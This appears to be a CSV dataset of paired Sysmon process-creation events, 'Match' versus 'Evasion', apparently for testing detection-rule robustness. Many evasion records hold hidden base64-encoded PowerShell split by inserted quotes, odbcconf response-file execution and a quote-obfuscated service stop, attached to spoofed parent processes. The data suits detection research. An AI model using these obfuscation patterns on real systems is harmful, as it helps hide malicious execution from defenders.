Pair Index,Match File,Evasion File,Match Cmd,Evasion Cmd,Match Cmd Type,Evasion Cmd Type
4347,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,"{'executable': 'C:\\Windows\\System32\\net1.exe', 'command_line': 'C:\\Windows\\System32\\net.exe share', 'pid': 948, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'args': ['taskhost.exe', 'SYSTEM'], 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'entity_id': '{19FC45AC-E775-601C-0000-001009455000}'}","{'command_line': 'net.exe s""top"" ""Service""', 'working_directory': 'C:\\BREACH\\', 'args': ['C:\\Windows\\py.exe', 'C:\\BREACH\\create_filing_dir.py'], 'entity_id': '{19FC45AC-7534-601C-0000-00105CAD0200}', 'pid': 2264, 'executable': 'C:\\Windows\\System32\\net.exe', 'parent': {'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-7533-601C-0000-0010825E0200}', 'pid': 1516, 'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe'}, 'name': 'py.exe', 'hash': {'md5': 'cc3ac75ddbfaa6d4ccbb0afad7eb759d', 'sha256': '3d98a354f1329bfeb17216d2391d6e9c04f6873b6e491bce9734c02c26574b3d'}}",Windows,Windows
4356,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,taskhost.exe SYSTEM,"""C:\Program Files\Mozilla Firefox\uninstall\helper.exe"" /UpdateShortcutAppUserModelIds",Windows,Windows
4357,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"{'executable': 'C:\\Windows\\System32\\net1.exe', 'command_line': 'C:\\Windows\\System32\\net.exe share', 'pid': 948, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'args': ['taskhost.exe', 'SYSTEM'], 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'entity_id': '{19FC45AC-E775-601C-0000-001009455000}'}","{'executable': 'C:\\Windows\\System32\\net1.exe', 'args': ['C:\\Program Files\\Mozilla Firefox\\uninstall\\helper.exe', '/UpdateShortcutAppUserModelIds'], 'pid': 2944, 'command_line': 'C:\\Windows\\System32\\net.exe share ', 'working_directory': 'C:\\BREACH\\', 'parent': {'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'command_line': '""C:\\Program Files\\Mozilla Firefox\\firefox.exe"" -foreground', 'name': 'firefox.exe', 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'entity_id': '{19FC45AC-FA07-601C-0000-0010C0245900}', 'pid': 2380}, 'name': 'helper.exe', 'hash': {'md5': '9178bd65fc4f7ec665c799dc801d4f1e', 'sha256': '67ec19c47423b9afb9e84e56530ad59db07be36eb68c00edfaf5cb36a0f65ed8'}, 'entity_id': '{19FC45AC-FA09-601C-0000-001089405900}'}",Windows,Windows
4360,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground","""C:\Program Files\Mozilla Firefox\uninstall\helper.exe"" /UpdateShortcutAppUserModelIds",Windows,Windows
4361,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"{'pid': 3456, 'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'hash': {'md5': '923fe895b22b22a9ca03c72f3d15ce20', 'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969'}, 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'entity_id': '{19FC45AC-89C4-601C-0000-00103CC41400}', 'command_line': 'powershell -enco IgAoACcAKgAnACkAOwAkA', 'working_directory': 'C:\\BREACH\\', 'parent': {'entity_id': '{19FC45AC-76DE-601C-0000-00103F9F0100}', 'pid': 1988, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup', 'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}, 'name': 'firefox.exe'}","{'pid': 1956, 'args': ['C:\\Program Files\\Mozilla Firefox\\uninstall\\helper.exe', '/UpdateShortcutAppUserModelIds'], 'hash': {'md5': '9178bd65fc4f7ec665c799dc801d4f1e', 'sha256': '67ec19c47423b9afb9e84e56530ad59db07be36eb68c00edfaf5cb36a0f65ed8'}, 'entity_id': '{19FC45AC-0656-601D-0000-0010E57C5E00}', 'command_line': 'powershell -w hidden -enco JABG""AGw""AeAByAGgAYwBmAGQAPQAnAEEAZQBwAG8AcQBhAHcAcABjAHkAcgBrACcAOwAkAFYAdwBnAHkAbwBzAGwAcwBzAGgAbgBzACAAPQAgACcANwA3ACcAOwAkAFMAbwByAHcAeAB1AHUAcQBzAD0AJwBXAHQAcwB4AG4AcgBwAGwAeQBqAGMAeABjACcAOwAkAEkAbgBhAHcAbgBqAHQAbABhAD0AJA""BlAG""4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQArACc', 'working_directory': 'C:\\BREACH\\', 'parent': {'entity_id': '{19FC45AC-0654-601D-0000-001024645E00}', 'pid': 3064, 'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'command_line': '""C:\\Program Files\\Mozilla Firefox\\firefox.exe"" -foreground', 'name': 'firefox.exe', 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground']}, 'name': 'helper.exe', 'executable': 'C:\\Program Files\\Mozilla Firefox\\uninstall\\helper.exe'}",Windows,Windows
4369,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground","""taskhost.exe""",Windows,Windows
4370,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"{'pid': 3456, 'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'hash': {'md5': '923fe895b22b22a9ca03c72f3d15ce20', 'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969'}, 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'entity_id': '{19FC45AC-89C4-601C-0000-00103CC41400}', 'command_line': 'powershell -enco IgAoACcAKgAnACkAOwAkA', 'working_directory': 'C:\\BREACH\\', 'parent': {'entity_id': '{19FC45AC-76DE-601C-0000-00103F9F0100}', 'pid': 1988, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup', 'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}, 'name': 'firefox.exe'}","{'entity_id': '{19FC45AC-76D9-601C-0000-00107E160100}', 'pid': 1336, 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'command_line': 'powershell -e P""AA""jACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA+ACAAJABZAFgAVQBRAEMAQgBRAFoAdwBEAD0AJwBWAGMAQQAxAFUAdwAxAFoAJwA7ACQAVQA0AFoAVQBrADQAQQBvADEANAB3AHcAQgAgAD0AIAAnADcAOAA0ACcAOwAkAFYAYwA0AHgAQQBHAEEAQQA9ACcAQwBCAF8AVQBBAFUAQQBjAGsAQQBBACcAOwAkAE4ARABVAF8AUQBHAEQAUQA9ACQAZQBuAHYAOg""B1""AHMA""ZQ""ByAHAAcgBvAGYAaQBsAGUAKwAnAFwAJwArACQAV', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-76D8-601C-0000-0010F1630000}', 'pid': 444}, 'name': 'taskhost.exe', 'args': ['taskhost.exe']}",Windows,Windows
4376,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground","""C:\Program Files\Mozilla Firefox\uninstall\helper.exe"" /UpdateShortcutAppUserModelIds",Windows,Windows
4377,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_06.json,"{'pid': 3456, 'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'hash': {'md5': '923fe895b22b22a9ca03c72f3d15ce20', 'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969'}, 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'entity_id': '{19FC45AC-89C4-601C-0000-00103CC41400}', 'command_line': 'powershell -enco IgAoACcAKgAnACkAOwAkA', 'working_directory': 'C:\\BREACH\\', 'parent': {'entity_id': '{19FC45AC-76DE-601C-0000-00103F9F0100}', 'pid': 1988, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup', 'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}, 'name': 'firefox.exe'}","{'executable': 'C:\\Program Files\\Mozilla Firefox\\uninstall\\helper.exe', 'name': 'helper.exe', 'hash': {'sha256': '67ec19c47423b9afb9e84e56530ad59db07be36eb68c00edfaf5cb36a0f65ed8', 'md5': '9178bd65fc4f7ec665c799dc801d4f1e'}, 'entity_id': '{19FC45AC-76E5-601C-0000-00108D0B0300}', 'command_line': 'powershell -enco AvACcA""Lg""AiAHMAYABwAEwAaQBUACIA""KAAn""ACoAJwApADsAJABMAFoAYwBaAEcAQQBBADEAUQ', 'working_directory': 'C:\\BREACH\\', 'parent': {'command_line': '""C:\\Program Files\\Mozilla Firefox\\firefox.exe"" -foreground', 'name': 'firefox.exe', 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'entity_id': '{19FC45AC-76E0-601C-0000-001082F20100}', 'pid': 2036, 'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe'}, 'args': ['C:\\Program Files\\Mozilla Firefox\\uninstall\\helper.exe', '/UpdateShortcutAppUserModelIds'], 'pid': 2656}",Windows,Windows
4384,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground","""LogonUI.exe"" /flags:0x0",Windows,Windows
4385,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_04.json,"{'pid': 3456, 'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'hash': {'md5': '923fe895b22b22a9ca03c72f3d15ce20', 'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969'}, 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'entity_id': '{19FC45AC-89C4-601C-0000-00103CC41400}', 'command_line': 'powershell -enco IgAoACcAKgAnACkAOwAkA', 'working_directory': 'C:\\BREACH\\', 'parent': {'entity_id': '{19FC45AC-76DE-601C-0000-00103F9F0100}', 'pid': 1988, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup', 'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}, 'name': 'firefox.exe'}","{'entity_id': '{19FC45AC-74C4-601C-0000-001076C30000}', 'parent': {'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe'], 'entity_id': '{19FC45AC-74C2-601C-0000-00105F5B0000}', 'pid': 384, 'executable': 'C:\\Windows\\System32\\winlogon.exe'}, 'name': 'LogonUI.exe', 'args': ['LogonUI.exe', '/flags:0x0'], 'hash': {'sha256': '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6', 'md5': '3ef0d8ab08385aab5802e773511a2e6a'}, 'pid': 732, 'executable': 'C:\\Windows\\System32\\LogonUI.exe', 'command_line': 'powershell -enco kAGUAbgB2ADoAdQBz""AGUA""cgBwAH""IA""bwBmAGkAbABlA', 'working_directory': 'C:\\Windows\\system32\\'}",Windows,Windows
4394,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground","""C:\Program Files\NetTime\NetTime.exe""",Windows,Windows
4395,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_01.json,"{'pid': 3456, 'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'hash': {'md5': '923fe895b22b22a9ca03c72f3d15ce20', 'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969'}, 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'entity_id': '{19FC45AC-89C4-601C-0000-00103CC41400}', 'command_line': 'powershell -enco IgAoACcAKgAnACkAOwAkA', 'working_directory': 'C:\\BREACH\\', 'parent': {'entity_id': '{19FC45AC-76DE-601C-0000-00103F9F0100}', 'pid': 1988, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup', 'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}, 'name': 'firefox.exe'}","{'working_directory': 'C:\\Windows\\system32\\', 'parent': {'pid': 1564, 'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-7500-601C-0000-00100B520200}'}, 'args': ['C:\\Program Files\\NetTime\\NetTime.exe'], 'hash': {'md5': '60b65f97c12ba30cd36450d376227c02', 'sha256': 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536'}, 'entity_id': '{19FC45AC-7501-601C-0000-0010CF860200}', 'pid': 2092, 'executable': 'C:\\Program Files\\NetTime\\NetTime.exe', 'command_line': 'powershell -""""enco PAAjACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA', 'name': 'NetTime.exe'}",Windows,Windows
4404,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground",taskhost.exe SYSTEM,Windows,Windows
4405,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_07.json,"{'pid': 3456, 'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'hash': {'md5': '923fe895b22b22a9ca03c72f3d15ce20', 'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969'}, 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'entity_id': '{19FC45AC-89C4-601C-0000-00103CC41400}', 'command_line': 'powershell -enco IgAoACcAKgAnACkAOwAkA', 'working_directory': 'C:\\BREACH\\', 'parent': {'entity_id': '{19FC45AC-76DE-601C-0000-00103F9F0100}', 'pid': 1988, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup', 'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}, 'name': 'firefox.exe'}","{'pid': 2536, 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'parent': {'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe'}, 'args': ['taskhost.exe', 'SYSTEM'], 'entity_id': '{19FC45AC-769C-601C-0000-0010DEEF0200}', 'command_line': 'powershell -w hidden -enco iACgAJ""wA""qACcAKQA7ACQA', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'taskhost.exe', 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}}",Windows,Windows
4414,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground",taskhost.exe SYSTEM,Windows,Windows
4415,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_08.json,"{'pid': 3456, 'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'hash': {'md5': '923fe895b22b22a9ca03c72f3d15ce20', 'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969'}, 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'entity_id': '{19FC45AC-89C4-601C-0000-00103CC41400}', 'command_line': 'powershell -enco IgAoACcAKgAnACkAOwAkA', 'working_directory': 'C:\\BREACH\\', 'parent': {'entity_id': '{19FC45AC-76DE-601C-0000-00103F9F0100}', 'pid': 1988, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup', 'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}, 'name': 'firefox.exe'}","{'working_directory': 'C:\\Windows\\system32\\', 'args': ['taskhost.exe', 'SYSTEM'], 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-00104B610000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'entity_id': '{19FC45AC-7534-601C-0000-0010469C0200}', 'pid': 2164, 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'command_line': 'powershell -w hidden -enco JABGAG""wAeAByAGgAYwBmAGQAPQAnAEEAZQBwAG8AcQ""BhAHcAcABjAH'}",Windows,Windows
4424,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -foreground","""C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe"" /noconfig /fullpaths @""C:\Users\client1\AppData\Local\Temp\c9tdssm-.cmdline""",Windows,Windows
4425,Microsoft-Windows-Sysmon_1_Match_05.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_05.json,"{'pid': 3456, 'executable': 'C:\\Program Files\\Mozilla Firefox\\firefox.exe', 'hash': {'md5': '923fe895b22b22a9ca03c72f3d15ce20', 'sha256': '98b7f5b40c557775cd645ca69b788fe4a3deae25cdb6e5dd4fb94db1bdc10969'}, 'args': ['C:\\Program Files\\Mozilla Firefox\\firefox.exe', '-foreground'], 'entity_id': '{19FC45AC-89C4-601C-0000-00103CC41400}', 'command_line': 'powershell -enco IgAoACcAKgAnACkAOwAkA', 'working_directory': 'C:\\BREACH\\', 'parent': {'entity_id': '{19FC45AC-76DE-601C-0000-00103F9F0100}', 'pid': 1988, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup', 'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}, 'name': 'firefox.exe'}","{'command_line': 'powershell -enco IgAoA""CcAK""gAn""ACk""AOwAkA', 'working_directory': 'C:\\Users\\client1\\AppData\\Local\\Temp\\SDIAG_2308ca95-70b0-4703-820a-672bc2b9f8cd\\', 'hash': {'md5': '3d7d2e825c63ff501e896cf008c70d75', 'sha256': '037fc52b8fc6089338eb456f2b45638ed36c42a4dca7ace391d166b2329838a1'}, 'entity_id': '{19FC45AC-7C51-601C-0000-00107C470C00}', 'pid': 1044, 'executable': 'C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe', 'parent': {'command_line': 'C:\\Windows\\System32\\sdiagnhost.exe -Embedding', 'name': 'sdiagnhost.exe', 'args': ['C:\\Windows\\System32\\sdiagnhost.exe', '-Embedding'], 'entity_id': '{19FC45AC-7C50-601C-0000-00106D370C00}', 'pid': 3804, 'executable': 'C:\\Windows\\System32\\sdiagnhost.exe'}, 'name': 'csc.exe', 'args': ['C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe', '/noconfig', '/fullpaths', '@C:\\Users\\client1\\AppData\\Local\\Temp\\c9tdssm-.cmdline']}",Windows,Windows
4434,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16","""C:\Program Files\NetTime\NetTime.exe""",Windows,Windows
4436,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_02.json,"{'working_directory': 'C:\\Windows\\system32', 'name': 'csrss.exe', 'args': ['%%SystemRoot%%\\system32\\csrss.exe', 'ObjectDirectory=\\Windows', 'SharedSection=1024,12288,512', 'Windows=On', 'SubSystemType=Windows', 'ServerDll=basesrv,1', 'ServerDll=winsrv:UserServerDllInitialization,3', 'ServerDll=winsrv:ConServerDllInitialization,2', 'ServerDll=sxssrv,4', 'ProfileControl=Off', 'MaxRequestThreads=16'], 'hash': {'md5': '342271f6142e7c70805b8a81e1ba5f5c', 'sha256': 'f9112b88fec5ef10a7aedf88dcee61956d1fcde7cb42197216e8265578713786'}, 'executable': 'C:\\Windows\\System32\\odbcconf.exe', 'pid': 356, 'command_line': 'C:\\Windows\\System32\\odbcconf.exe -f another.rsp', 'parent': {'name': 'smss.exe', 'args': ['\\SystemRoot\\System32\\smss.exe', '00000001', '0000003c'], 'entity_id': '{19FC45AC-74C2-601C-0000-00108E580000}', 'pid': 340, 'executable': 'C:\\Windows\\System32\\smss.exe', 'command_line': '\\SystemRoot\\System32\\smss.exe 00000001 0000003c '}, 'entity_id': '{19FC45AC-74C2-601C-0000-001081590000}'}","{'working_directory': 'C:\\Windows\\system32\\', 'parent': {'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-7691-601C-0000-00101A130100}', 'pid': 1288, 'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE'}, 'entity_id': '{19FC45AC-7691-601C-0000-00104C570100}', 'executable': 'C:\\Windows\\System32\\odbcconf.exe', 'name': 'NetTime.exe', 'args': ['C:\\Program Files\\NetTime\\NetTime.exe'], 'hash': {'sha256': 'd06598f2f203cec7a7a3857f727bc2ba457c1c0cef2787b90ce553407fbf8536', 'md5': '60b65f97c12ba30cd36450d376227c02'}, 'pid': 1596, 'command_line': 'C:\\Windows\\System32\\odbcconf.exe /f another.rsp'}",Windows,Windows
4444,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"%%SystemRoot%%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,12288,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",C:\Windows\system32\Macromed\Flash\FlashPlayerUpdateService.exe,Windows,Windows
4446,Microsoft-Windows-Sysmon_1_Match_02.json,Microsoft-Windows-Sysmon_1_Evasion_Cmdline_03.json,"{'working_directory': 'C:\\Windows\\system32', 'name': 'csrss.exe', 'args': ['%%SystemRoot%%\\system32\\csrss.exe', 'ObjectDirectory=\\Windows', 'SharedSection=1024,12288,512', 'Windows=On', 'SubSystemType=Windows', 'ServerDll=basesrv,1', 'ServerDll=winsrv:UserServerDllInitialization,3', 'ServerDll=winsrv:ConServerDllInitialization,2', 'ServerDll=sxssrv,4', 'ProfileControl=Off', 'MaxRequestThreads=16'], 'hash': {'md5': '342271f6142e7c70805b8a81e1ba5f5c', 'sha256': 'f9112b88fec5ef10a7aedf88dcee61956d1fcde7cb42197216e8265578713786'}, 'executable': 'C:\\Windows\\System32\\odbcconf.exe', 'pid': 356, 'command_line': 'C:\\Windows\\System32\\odbcconf.exe -f another.rsp', 'parent': {'name': 'smss.exe', 'args': ['\\SystemRoot\\System32\\smss.exe', '00000001', '0000003c'], 'entity_id': '{19FC45AC-74C2-601C-0000-00108E580000}', 'pid': 340, 'executable': 'C:\\Windows\\System32\\smss.exe', 'command_line': '\\SystemRoot\\System32\\smss.exe 00000001 0000003c '}, 'entity_id': '{19FC45AC-74C2-601C-0000-001081590000}'}","{'entity_id': '{19FC45AC-25A8-601D-0000-00109F996E00}', 'pid': 2064, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'FlashPlayerUpdateService.exe', 'hash': {'md5': '1234a12b71dae034e45c714ae5a54412', 'sha256': '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d'}, 'executable': 'C:\\Windows\\System32\\odbcconf.exe', 'command_line': 'odbcconf.exe /f nicefile.rsp', 'args': ['C:\\Windows\\system32\\Macromed\\Flash\\FlashPlayerUpdateService.exe']}",Windows,Windows
